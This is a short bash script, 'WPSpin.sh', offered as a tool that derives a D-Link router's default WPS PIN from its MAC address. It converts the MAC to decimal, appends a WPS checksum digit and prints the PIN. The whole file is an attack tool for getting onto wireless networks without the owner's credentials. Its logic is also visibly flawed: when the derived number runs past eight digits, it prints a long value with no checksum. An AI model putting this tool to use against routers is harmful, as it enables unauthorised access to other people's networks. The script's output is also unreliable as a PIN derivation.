#!/bin/bash
printf "\n\n";

echo " WPSpin.sh <phoenix!>";

echo " Reverse Engineering Dlink's default wps pin generated based on MAC of the device ";

printf "\n\n";

MAC=$1

if [ -z $MAC ];

	then

	echo " USAGE shown below";
	printf "\n";
	echo " ./wpspin.sh 12456";
	printf "\n";
	


	
else

	pin=$(echo "ibase=16; $MAC" | bc);
	chksum=$(echo "ibase=16; $MAC" | bc);

	i=0;

	for (( ; ; ))
	do
		if [ $chksum -eq 0 ]; then


			chksum=$(echo "(10-$i%10)%10" | bc);
			break;

		fi

		j=$(echo "$i+3*($chksum%10)" | bc);
		k=$(echo "$chksum/10" | bc);
		i=$(echo "$j+$k%10" | bc);
		chksum=$(echo "$k/10" | bc);

	done

	wpspin=$(echo "$pin$chksum");

	check=${#wpspin};

	if [ $check -gt 8 ];
		then

		wpspin=$(echo "$pin");

	fi

	
	printf "Your WPS Pin : ";
	echo "$wpspin";
	printf "\n\n";

	
fi
